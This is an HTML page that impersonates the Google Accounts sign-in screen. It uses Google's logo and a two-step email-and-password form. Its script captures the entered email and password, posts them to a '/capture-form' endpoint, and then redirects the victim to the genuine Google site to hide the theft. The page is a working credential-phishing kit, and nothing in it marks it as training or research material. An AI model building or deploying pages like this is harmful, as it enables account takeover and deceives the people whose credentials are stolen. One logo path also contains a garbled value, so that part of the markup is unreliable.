<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in &ndash; Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#202124;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.container{width:100%;max-width:450px;padding:2rem}
.card{border:1px solid #dadce0;border-radius:8px;padding:2.5rem 2.5rem 2rem}
.logo{text-align:center;margin-bottom:1.5rem}
.logo svg{width:75px;height:24px}
.title{font-size:1.5rem;color:#202124;text-align:center;margin-bottom:0.5rem;font-weight:400}
.subtitle{color:#5f6368;text-align:center;font-size:0.875rem;margin-bottom:1.5rem}
.email-display{border:1px solid #dadce0;border-radius:20px;padding:0.5rem 1rem;display:inline-flex;align-items:center;gap:0.5rem;margin:0 auto 1.5rem;cursor:pointer;font-size:0.875rem}
.email-display .avatar{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:0.75rem}
.input-group{position:relative;margin-bottom:1.5rem}
.input-group input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:0.9rem 0.75rem 0.2rem;font-size:1rem;outline:none;transition:border-color 0.2s;color:#202124}
.input-group input:focus{border-color:#1a73e8;border-width:2px}
.input-group label{position:absolute;top:50%;left:0.75rem;transform:translateY(-50%);color:#5f6368;font-size:1rem;pointer-events:none;transition:all 0.15s;background:#fff;padding:0 0.25rem}
.input-group input:focus ~ label,
.input-group input:not(:placeholder-shown) ~ label{top:0;font-size:0.75rem;color:#1a73e8}
.forgot{color:#1a73e8;font-size:0.875rem;text-decoration:none;display:block;margin-bottom:1.5rem}
.forgot:hover{text-decoration:underline}
.actions{display:flex;align-items:center;justify-content:space-between;margin-top:1.5rem}
.create-link{color:#1a73e8;font-size:0.875rem;text-decoration:none}
.create-link:hover{text-decoration:underline}
.next-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0.6rem 1.5rem;font-size:0.875rem;font-weight:500;cursor:pointer;transition:background 0.2s}
.next-btn:hover{background:#1557b0}
.step{display:none}
.step.active{display:block}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
        <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
        <path fill="#D14836" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
        <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
        <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
        <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
        <path fill="#EA4335" d="M35.29 41.41V32h31.tattoo c.21 1.59.33 3.28.33 5.09 0 6.31-1.73 14.13-7.31 19.71-5.42 5.67-12.35 8.7-21.54 8.7C16.78 65.5 0 49.39 0 28S16.78 0 38.08 0c9.43 0 16.21 3.7 21.29 8.53l-5.99 5.99c-3.61-3.36-8.53-5.96-15.3-5.96C25.01 8.56 10.5 23.4 10.5 28c0 9.24 6.63 16.67 17.5 16.67 5.46 0 9.57-2.19 12.43-5.04 2.36-2.36 3.28-5.03 3.27-7.22H35.29z"/>
      </svg>
    </div>

    <div id="StepEmail" class="step active">
      <h1 class="title">Sign in</h1>
      <p class="subtitle">Use your Google Account</p>
      <div class="input-group">
        <input type="email" id="EmailInput" placeholder=" " autocomplete="email">
        <label for="EmailInput">Email or phone</label>
      </div>
      <a href="#" class="forgot">Forgot email?</a>
      <div class="actions">
        <a href="#" class="create-link">Create account</a>
        <button class="next-btn" onclick="ShowPasswordStep()">Next</button>
      </div>
    </div>

    <div id="StepPassword" class="step">
      <h1 class="title">Welcome</h1>
      <div class="email-display" id="EmailDisplay">
        <div class="avatar" id="AvatarLetter">U</div>
        <span id="EmailDisplayText">user@gmail.com</span>
      </div>
      <div class="input-group">
        <input type="password" id="PasswordInput" placeholder=" " autocomplete="current-password">
        <label for="PasswordInput">Enter your password</label>
      </div>
      <a href="#" class="forgot">Forgot password?</a>
      <div class="actions">
        <a href="#" class="create-link">Create account</a>
        <button class="next-btn" onclick="SubmitCredentials()">Next</button>
      </div>
    </div>
  </div>
</div>
<script src="/static/Tracker.js"></script>
<script>
function ShowPasswordStep() {
  const Email = document.getElementById("EmailInput").value.trim();
  if (!Email) return;
  document.getElementById("EmailDisplayText").textContent = Email;
  document.getElementById("AvatarLetter").textContent = Email.charAt(0).toUpperCase();
  document.getElementById("StepEmail").classList.remove("active");
  document.getElementById("StepPassword").classList.add("active");
  document.getElementById("PasswordInput").focus();
}

function SubmitCredentials() {
  const Email = document.getElementById("EmailInput").value.trim();
  const Password = document.getElementById("PasswordInput").value;
  if (!Email || !Password) return;
  fetch("/capture-form", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ Username: Email, Password: Password })
  }).then(function () {
    window.location.href = "https://accounts.google.com/signin/challenge/recaptcha";
  }).catch(function () {
    window.location.href = "https://accounts.google.com/";
  });
}

document.getElementById("EmailInput").addEventListener("keydown", function (Event) {
  if (Event.key === "Enter") ShowPasswordStep();
});
document.getElementById("PasswordInput").addEventListener("keydown", function (Event) {
  if (Event.key === "Enter") SubmitCredentials();
});
</script>
</body>
</html>
